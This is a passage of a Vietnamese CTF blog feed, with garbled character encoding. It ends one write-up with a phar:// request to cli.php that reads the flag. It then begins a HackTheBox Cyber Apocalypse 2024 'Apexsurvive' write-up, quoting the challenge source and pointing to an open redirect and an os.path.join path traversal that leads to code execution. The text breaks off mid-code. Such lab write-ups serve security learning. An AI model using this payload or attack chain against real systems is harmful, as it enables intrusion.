Request Ä‘áº¿n cli.php Ä‘á»ƒ lá»¥m flag thÃ´i:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;GET&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cli&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cli&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;+-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;phar&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;///&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;uploads&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;3e10700&lt;/span&gt;&lt;span class="n"&gt;de9433bdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;png&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;xml&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/Sk35G3yNC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/rkSiM3yEC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;</description></item><item><title>Cyber Apocalypse 2024 Write Up</title><link>https://kev1n1203.github.io/p/htb-cyber-apocalypse-2024/</link><pubDate>Fri, 15 Mar 2024 10:31:07 +0000</pubDate><guid>https://kev1n1203.github.io/p/htb-cyber-apocalypse-2024/</guid><description>&lt;p&gt;Dáº¡o nÃ y mÃ¬nh khÃ¡ lÃ  hay viáº¿t wu cÃ¡c ctf challenge (cháº¯c cháº¯n khÃ´ng pháº£i lÃ  do ngÃ y trÆ°á»›c mÃ¬nh lÆ°á»i), nÃ³ dÆ°á»ng nhÆ° Ä‘Ã£ táº¡o cho mÃ¬nh thÃ³i quen hÃ ng tuáº§n mÃ¬nh sáº½ wu láº¡i nhá»¯ng challenge mÃ¬nh chÆ¡i vÃ  mÃ¬nh tháº¥y hay vÃ  há»c Ä‘Æ°á»£c nhiá»u thá»© tá»« nÃ³. CÃ¢u láº¡c bá»™ mÃ¬nh tuáº§n nÃ y cÃ³ tham gia giáº£i HTB - Cyber Apocalypse 2024, pháº£i cÃ´ng nháº­n Ä‘Ã¢y lÃ  má»™t giáº£i dÃ i hÆ¡i vÃ  mÃ¬nh Ä‘Ã£ tá»‘n tÆ°Æ¡ng Ä‘á»‘i thá»i gian cho cÃ¡c challenge web cá»§a giáº£i nÃ y (cá»¥ thá»ƒ lÃ  4 ngÃ y) nhÆ°ng váº«n khÃ´ng thá»ƒ solve Ä‘Æ°á»£c háº¿t web challenge cá»§a giáº£i, báº£n thÃ¢n mÃ¬nh cÃ²n pháº£i há»c há»i ráº¥t nhiá»u ná»¯a má»›i cÃ³ thá»ƒ hiá»ƒu vÃ  solve Ä‘Æ°á»£c dáº¡ng bÃ i web cuá»‘i cÃ¹ng náº¿u láº§n sau cÃ²n gáº·p láº¡i. Giáº£i Ä‘Ã£ káº¿t thÃºc vÃ  cÅ©ng nhá» sá»± cá»‘ gáº¯ng, try hard cá»§a cÃ¡c anh em trong cÃ¢u láº¡c bá»™ Ä‘áº¿n tá»« má»i máº£ng mÃ  clb mÃ¬nh cÅ©ng Ä‘áº¡t Ä‘Æ°á»£c thá»© háº¡ng mÃ¬nh nghÄ© lÃ  khÃ¡ cao , hehe.
Lan man váº­y cÅ©ng Ä‘á»§ rá»“i, sau Ä‘Ã¢y sáº½ lÃ  quÃ¡ trÃ¬nh mÃ¬nh vÃ  cÃ¡c teamates trong KCSC Ä‘i giáº£i cÃ¡c challenge web HTB, cÅ©ng nhÆ° cÃ¡ch hiá»ƒu cá»§a mÃ¬nh vá» web chall Ä‘Ã³. Let&amp;rsquo;s go!!&lt;/p&gt;
&lt;h2 id="apexsurvive"&gt;Apexsurvive
&lt;/h2&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/BJWQ18b0p.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="preface"&gt;Preface
&lt;/h3&gt;&lt;p&gt;ÄÃ¢y lÃ  má»™t chall white box nÃªn mÃ¬nh download source vá» rá»“i dá»±ng local khai thÃ¡c cho nÃ³ tiá»‡n theo dÃµi, hehe :&amp;quot;)))
Sau khi dá»±ng xong thÃ¬ mÃ¬nh cÅ©ng pháº£i khÃ¡ choÃ¡ng vÃ¬ dockerfile cá»§a bÃ i nÃ y nhá»¯ng 70 dÃ²ng, nÃªn mÃ¬nh tÃ² mÃ² Ä‘á»c Ä‘á»ƒ náº¯m trÆ°á»›c cáº§n pháº£i lÃ m gÃ¬ á»Ÿ chall nÃ y&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;# Setup flag
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;COPY flag.txt /root/flag
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RUN chmod 600 /root/flag
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;# Setup readflag
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;COPY config/readflag.c /
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RUN gcc -o /readflag /readflag.c &amp;amp;&amp;amp; chmod 4755 /readflag &amp;amp;&amp;amp; rm /readflag.c
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Docker nhÆ° nÃ y lÃ  mÃ¬nh pháº£i RCE Ä‘á»ƒ láº¥y flag rÃ¹i
Chall cÃ³ 2 service, 1 service web chÃ­nh cháº¡y python, vÃ  service email cháº¡y js (vÃ  bot), nÃªn mÃ¬nh nghÄ© cháº¯c sáº½ cÃ³ cáº£ lá»— há»•ng client side vÃ  server side trong challenge nÃ y&lt;/p&gt;
&lt;h3 id="verify-email-token"&gt;Verify email token
&lt;/h3&gt;&lt;p&gt;VÃ o chall thÃ¬ mÃ¬nh Ä‘Æ°á»£c &amp;lsquo;hÆ°á»›ng dáº«n&amp;rsquo; Ä‘Äƒng kÃ­ vá»›i tÃªn &lt;code&gt;test@email.htb&lt;/code&gt; vÃ  Ä‘á»ƒ nháº­n Ä‘Æ°á»£c token email verify, nÃªn cÅ©ng nhanh nháº£u register vÃ  nháº­n Ä‘Æ°á»£c token á»Ÿ endpoint &lt;code&gt;/email&lt;/code&gt; khi Ä‘Ã£ vÃ o account settings vÃ  chá»n verify:
&lt;img src="https://hackmd.io/_uploads/HyQiJEmC6.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Sau khi verify mÃ¬nh tháº¥y cÃ³ chá»©c nÄƒng report vÃ  tham sá»‘ truyá»n vÃ o lÃ  ID cá»§a sáº£n pháº©m cÃ³ táº¡i &lt;code&gt;/challenge/home&lt;/code&gt;(nghe mÃ¹i xss quÃ¡)
Äi vÃ o Ä‘á»c source, mÃ¬nh tháº¥y cÃ³ endpoint &lt;code&gt;/eternal&lt;/code&gt; khÃ¡ hay khi cho phÃ©p redirect Ä‘áº¿n endpoint mÃ¬nh control:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;span class="lnt"&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@web.route(&amp;#39;/external&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def external():
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; url = request.args.get(&amp;#39;url&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if not url:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return redirect(&amp;#39;/&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return redirect(url)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vá»›i viá»‡c cookie Ä‘Æ°á»£c set &lt;strong&gt;samesite: strict&lt;/strong&gt;, mÃ¬nh nghÄ© Ä‘áº¿n viá»‡c bypass Samesite Strict báº±ng redirect nÃªn Ä‘Ã£ ngá»“i vá»›i tháº±ng nÃ y cáº£ buá»•i nhÆ°ng khÃ´ng cÃ³ káº¿t quáº£ :cry:&lt;/p&gt;
&lt;h3 id="mÃ²-máº«m-source-code"&gt;MÃ² máº«m source code
&lt;/h3&gt;&lt;p&gt;Sau khi tá»‘n kha khÃ¡ thá»i gian vá»›i tháº±ng endpoint nÃ y mÃ  khÃ´ng Ä‘Æ°á»£c káº¿t quáº£ gÃ¬, mÃ¬nh quyáº¿t Ä‘á»‹nh táº¡m thá»i bá» qua vÃ  hÆ°á»›ng Ä‘áº¿n cÃ¡c chá»©c nÄƒng khÃ¡c, cÃ³ 2 chá»©c nÄƒng Ä‘Ã¡ng chÃº Ã½ khi mÃ¬nh cÃ³ thá»ƒ lÃªn Ä‘Æ°á»£c admin, Ä‘Ã³ lÃ  thÃªm sáº£n pháº©m/addItem vÃ  thÃªm contract/addContract.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Chá»©c nÄƒng thÃªm sáº£n pháº©m cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng khi mÃ¬nh thá»a mÃ£n &lt;strong&gt;isInternal&lt;/strong&gt; (cá»¥ thá»ƒ lÃ  thuá»™c tÃ­nh &lt;strong&gt;isInternal&lt;/strong&gt; cá»§a user trong db lÃ  true) thÃ¬ cÃ³ thá»ƒ sá»­ dá»¥ng, addItem dÃ¹ng Ä‘á»ƒ thÃªm má»™t sáº£n pháº©m má»›i vÃ o shop. Tuy nhiÃªn thÃ¬ cÃ¡c input cÅ©ng Ä‘Ã£ Ä‘Æ°á»£c sanitize chá»‰ cho phÃ©p nháº­p vÃ o cÃ¡c tag vÃ  attribute nháº¥t Ä‘á»‹nh Ä‘Æ°á»£c quy Ä‘á»‹nh trong &lt;code&gt;middlewares.py&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@api.route(&amp;#39;/addItem&amp;#39;, methods=[&amp;#39;POST&amp;#39;])
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@isAuthenticated
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@isVerified
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@isInternal
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@antiCSRF
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@sanitizeInput
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def addItem(decodedToken):
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; name = request.form.get(&amp;#39;name&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; price = request.form.get(&amp;#39;price&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; description = request.form.get(&amp;#39;description&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; image = request.form.get(&amp;#39;imageURL&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; note = request.form.get(&amp;#39;note&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; seller = request.form.get(&amp;#39;seller&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if any(value == &amp;#39;&amp;#39; for value in [name, price, description, image, note, seller]):
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return response(&amp;#39;All fields are required!&amp;#39;), 401
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; newProduct = addProduct(name, image, description, price, seller, note)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if newProduct:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return response(&amp;#39;Product Added&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return response(&amp;#39;Something went wrong!&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Chá»©c nÄƒng mÃ¬nh muá»‘n nÃ³i Ä‘áº¿n thÃªm contract, khi upload 1 file lÃªn, server lÆ°u ná»™i dung vÃ o &lt;code&gt;/tmp/temporaryUpload&lt;/code&gt; rá»“i má»›i check ná»™i dung cá»§a file Ä‘Ã³ á»Ÿ hÃ m checkPDF sá»­ dá»¥ng PdfReader mode strict (khÃ³ cá»©u ca nÃ y). Náº¿u check thÃ nh cÃ´ng sáº½ ná»‘i &lt;code&gt;/app/application&lt;/code&gt;, &lt;code&gt;contracts&lt;/code&gt; vÃ  file name báº±ng &lt;strong&gt;os.path.join&lt;/strong&gt; Ä‘á»ƒ táº¡o thÃ nh file path hoÃ n chá»‰nh. HÃ m &lt;strong&gt;path.join&lt;/strong&gt; dÃ­nh path traversal náº·ng vÃ  Ä‘Ã¢y lÃ  lá»—i mÃ¬nh cáº§n khai thÃ¡c Ä‘á»ƒ exploit path traversal upload file to RCE.
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/r1noqEQR6.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;api&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/addContract&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;methods&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;isAuthenticated&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;isVerified&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;isInternal&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;isAdmin&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;antiCSRF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;sanitizeInput&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;addContract&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;decodedToken&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;uploadedFile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;uploadedFile&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;All files required!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;uploadedFile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Invalid file!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;uploadedFile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/tmp/temporaryUpload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;isValidPDF&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;checkPDF&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;isValidPDF&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;filePath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;current_app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;root_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;contracts&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span 